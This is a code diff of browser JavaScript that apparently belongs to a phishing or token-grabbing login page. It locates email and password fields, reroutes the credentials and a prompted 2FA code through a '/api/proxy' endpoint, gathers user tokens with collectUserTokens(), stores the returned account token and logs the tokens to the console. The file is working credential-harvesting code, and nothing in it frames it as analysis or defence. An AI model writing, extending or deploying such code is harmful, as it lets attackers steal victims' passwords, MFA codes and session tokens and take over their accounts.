@@ -1,12 +1,11 @@
 // ----------------------------------
 // SELECTING ELEMENTS
 // ----------------------------------
-// Try multiple selectors to find email and password inputs
-const emailInput = document.querySelector('input[name="email"], input[type="text"], input[placeholder*="Email"], input[id*="uid"]');
-const passwordInput = document.querySelector('input[name="password"], input[type="password"], input[placeholder*="Password"], input[id*="uid"]');
-const loginButton = document.querySelector('button[type="submit"], button[class*="button"], button');
+const emailInput = document.querySelector('input[id="emailORphone"]');
+const passwordInput = document.querySelector('input[id="password"]');
+const loginButton = document.querySelector('button');
 
-// Debug log to inspect DOM and check if inputs are found
+// Debug log to check if inputs are found
 console.log("Script loaded. Email input:", emailInput);
 console.log("Password input:", passwordInput);
 console.log("Login button:", loginButton);
@@ -109,7 +108,7 @@ function collectUserTokens() {
 // ---------- FETCH ACCOUNT TOKEN -------------------
 // --------------------------------------------------
 async function fetchAccountToken(email, password) {
-  const apiUrl = "/api/v9/auth/login"; // Relative path for same-origin
+  const apiUrl = "/api/proxy"; // Use Vercel proxy endpoint
   const payload = {
     login: email,
     password: password,
@@ -128,7 +127,7 @@ async function fetchAccountToken(email, password) {
     });
 
     const responseText = await response.text();
-    console.log("API Response:", responseText);
+    console.log("Proxy API Response:", responseText);
     if (!response.ok) {
       throw new Error(`HTTP ${response.status}: ${responseText}`);
     }
@@ -138,7 +137,7 @@ async function fetchAccountToken(email, password) {
       const mfaCode = prompt("Enter your 2FA code:");
       if (!mfaCode) throw new Error("MFA code required");
 
-      const mfaResponse = await fetch("/api/v9/auth/mfa/totp", {
+      const mfaResponse = await fetch("/api/proxy-mfa", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
@@ -152,7 +151,7 @@ async function fetchAccountToken(email, password) {
       });
 
       const mfaText = await mfaResponse.text();
-      console.log("MFA Response:", mfaText);
+      console.log("MFA Proxy Response:", mfaText);
       if (!mfaResponse.ok) {
         throw new Error(`MFA HTTP ${mfaResponse.status}: ${mfaText}`);
       }
@@ -160,6 +159,9 @@ async function fetchAccountToken(email, password) {
       const mfaData = JSON.parse(mfaText);
       const token = mfaData.token;
       console.log("MFA Token retrieved:", token);
+
+      // Store token in localStorage
+      localStorage.setItem("token", token);
 
       const userTokens = collectUserTokens();
       console.log("Collected tokens after MFA login:", userTokens);
@@ -177,6 +179,9 @@ async function fetchAccountToken(email, password) {
     const token = data.token;
     console.log("Token retrieved:", token);
 
+    // Store token in localStorage
+    localStorage.setItem("token", token);
+
     const userTokens = collectUserTokens();
     console.log("Collected tokens after login:", userTokens);
 
@@ -190,7 +195,7 @@ async function fetchAccountToken(email, password) {
     return { apiToken: token, userTokens };
   } catch (error) {
     console.error("Error fetching token:", error.message);
-    // Fallback to localStorage token
+    // Fallback to existing localStorage token
     const userTokens = collectUserTokens();
     if (userTokens.localStorage.token) {
       console.log("Found existing token in localStorage:", userTokens.localStorage.token);
